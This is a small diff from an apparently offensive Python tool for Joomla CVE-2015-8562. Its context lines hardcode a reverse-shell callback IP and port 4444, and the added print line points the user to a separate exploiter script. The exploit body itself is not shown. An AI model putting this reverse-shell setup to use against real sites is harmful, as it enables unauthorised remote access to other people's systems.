@@ -123,6 +123,8 @@ def main():
     revshell = '189.61.111.244'
     port = 4444
     Joomla_CVE_2015_8562(filename, revshell, port)
+    print('[+] \033[31mThe results of this parser can be exploited '
+          'by\033[33m ../exploits/exploiter.py\033[39m\n')
 
 
 if __name__ == '__main__':
